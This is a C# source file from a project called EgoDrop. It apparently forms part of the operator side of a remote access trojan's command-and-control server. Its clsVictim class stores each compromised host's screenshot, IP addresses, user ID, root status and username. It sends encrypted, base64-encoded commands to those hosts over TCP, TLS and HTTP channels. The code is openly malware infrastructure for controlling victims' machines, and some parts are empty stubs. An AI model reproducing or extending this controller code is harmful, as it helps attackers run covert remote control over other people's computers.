using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net.Security;
using System.Net.Sockets;
using System.Runtime.Intrinsics.Arm;
using System.Text;
using System.Threading.Tasks;

using Fleck;

namespace EgoDrop
{
    public class clsVictim
    {
        public struct stVictimConfig
        {
            public Image imgScreen;
            public string szID;
            public string szIpAddrInternal;
            public string szIpAddrExternal;
            public uint nUid;
            public string szUsername;
            public bool bIsRoot { get { return nUid == 0; } }
            public string szFilePath;
        }

        public Socket m_sktClnt { get; set; }
        public SslStream m_sslClnt { get; set; }
        public NetworkStream m_streamClnt { get; set; }

        public clsHttpPkt m_httpPkt { get; set; }

        public byte[] m_abBuffer = new byte[65535];

        public clsCrypto m_crypto { get; set; }
        public clsListener m_listener { get; set; }

        public clsVictim(Socket sktClnt, clsListener listener)
        {
            m_sktClnt = sktClnt;
            m_listener = listener;

            m_crypto = new clsCrypto(true);
        }
        
        public clsVictim(Socket sktClnt, SslStream sslstream, clsListener listener)
        {
            m_sktClnt = sktClnt;
            m_sslClnt = sslstream;
            m_listener = listener;
        }

        public clsVictim(Socket sktClnt, NetworkStream streamClnt, clsHttpPkt httpPkt, clsListener listener)
        {
            m_sktClnt = sktClnt;
            m_streamClnt = streamClnt;
            m_httpPkt = httpPkt;
            m_listener = listener;

            m_crypto = new clsCrypto(true);
        }

        public void fnSend(uint nCommand, uint nParam, string szMsg) => fnSend(nCommand, nParam, Encoding.UTF8.GetBytes(szMsg));
        public void fnSend(uint nCommand, uint nParam, byte[] abMsg) => fnSendRaw(new clsEDP((byte)nCommand, (byte)nParam, abMsg).fnabGetBytes());
        public void fnSendRaw(byte[] abBuffer)
        {
            m_sktClnt.BeginSend(abBuffer, 0, abBuffer.Length, SocketFlags.None, new AsyncCallback((ar) =>
            {
                try
                {
                    m_sktClnt.EndSend(ar);
                }
                catch (Exception ex)
                {
                    MessageBox.Show(ex.Message);
                }
            }), abBuffer);
        }

        public void fnSendEncryptedCommand(uint nCommand, uint nParam, List<string> lsMsg)
        {

        }

        public void fnSendCmdParam(uint nCmd, uint nParam)
        {
            clsEDP edp = new clsEDP((byte)nCmd, (byte)nParam, Encoding.UTF8.GetBytes(clsEZData.fnGenerateRandomStr()));
            switch (m_listener.m_stListener.protoListener)
            {
                case clsSqlite.enListenerProtocol.TCP:
                    fnSendRaw(edp.fnabGetBytes());
                    break;
                case clsSqlite.enListenerProtocol.HTTP:
                    fnHttpSend(nCmd, nParam, clsEZData.fnGenerateRandomStr());
                    break;
            }
        }

        public void fnSendCommand(string szMsg) => fnSendCommand(szMsg.Split('|').ToList());
        public void fnSendCommand(string[] aMsg) => fnSendCommand(aMsg.ToList());
        public void fnSendCommand(List<string> lsMsg)
        {
            lsMsg = lsMsg.Select(x => clsEZData.fnStrE2B64(x)).ToList();
            string szMsg = string.Join("|", lsMsg);
            byte[] abBuffer = { };
            
            switch (m_listener.m_stListener.protoListener)
            {
                case clsSqlite.enListenerProtocol.TCP:
                    abBuffer = m_crypto.fnabAESEncrypt(szMsg);
                    fnSend(2, 0, abBuffer);
                    break;
                case clsSqlite.enListenerProtocol.TLS:
                    abBuffer = Encoding.UTF8.GetBytes(szMsg);
                    fnSslSend(abBuffer);
                    break;
                case clsSqlite.enListenerProtocol.DNS:

                    break;
                case clsSqlite.enListenerProtocol.HTTP:
                    abBuffer = m_crypto.fnabAESEncrypt(szMsg);
                    fnHttpSend(2, 0, abBuffer);
                    break;
            }
        }

        public void fnSslSend(string szMsg) => fnSslSend(szMsg.Split('|').ToList());
        public void fnSslSend(string[] aMsg) => fnSslSend(aMsg.ToList());
        public void fnSslSend(byte[] abBuffer) => fnSslSendRAW(new clsEDP(0, 0, abBuffer).fnabGetBytes());
        public void fnSslSend(List<string> lsMsg)
        {
            lsMsg = clsEZData.fnLsE2B64(lsMsg);
            string szMsg = string.Join("|", lsMsg);
            byte[] abMsg = Encoding.UTF8.GetBytes(szMsg);

            clsEDP edp = new clsEDP(0, 0, abMsg);
            byte[] abBuffer = edp.fnabGetBytes();

            fnSslSendRAW(abBuffer);
        }
        public void fnSslSendRAW(byte[] abBuffer)
        {
            m_sslClnt.BeginWrite(abBuffer, 0, abBuffer.Length, new AsyncCallback((ar) =>
            {
                try
                {
                    m_sslClnt.EndWrite(ar);
                }
                catch (Exception ex)
                {

                }
            }), abBuffer);
        }

        public void fnHttpSend(uint nCommand, uint nParam, string szBody) => fnHttpSend(nCommand, nParam, Encoding.UTF8.GetBytes(szBody));
        public void fnHttpSend(uint nCommand, uint nParam, byte[] abBody)
        {
            clsEDP edp = new clsEDP((byte)nCommand, (byte)nParam, abBody);
            string szMsg = Convert.ToBase64String(edp.fnabGetBytes());

            byte[] abResp = m_httpPkt.fnabGetPacket(szMsg);
            fnHttpSendRAW(abResp);
        }

        public void fnHttpSendRAW(byte[] abResp)
        {
            m_streamClnt.BeginWrite(abResp, 0, abResp.Length, new AsyncCallback((ar) =>
            {
                try
                {
                    m_streamClnt.EndWrite(ar);
                }
                catch (Exception ex)
                {

                }
            }), abResp);
        }
    }
}
